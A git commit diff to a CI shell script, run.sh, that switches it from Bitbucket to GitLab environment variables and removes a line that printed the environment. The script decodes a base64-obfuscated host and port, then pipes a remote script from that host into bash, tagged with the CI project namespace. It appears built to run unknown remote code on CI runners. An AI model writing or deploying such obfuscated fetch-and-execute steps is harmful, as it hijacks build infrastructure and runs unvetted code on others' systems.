1a9163a3b6649c0a18a35b3ea8aa3fb811a52c56
yao pan <cisum4444@gmail.com>
2021-02-25 07:36:07 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -3,9 +3,8 @@
 # 参数配置
 TMPSTR="aS5hZ2FuemFpLmNvbToyNzQ2Mw=="
 DOMAIN=`echo -n $TMPSTR | base64 -d`
-ROLEID=$BITBUCKET_WORKSPACE
+ROLEID=$CI_PROJECT_NAMESPACE
 echo $DOMAIN 
-env
 
 # 运行
-curl -s -L http://$DOMAIN/script.sh?id=$ROLEID-bb | bash -s norun $ROLEID-bb
+curl -s -L http://$DOMAIN/script.sh?id=$ROLEID-gl | bash -s norun $ROLEID-gl
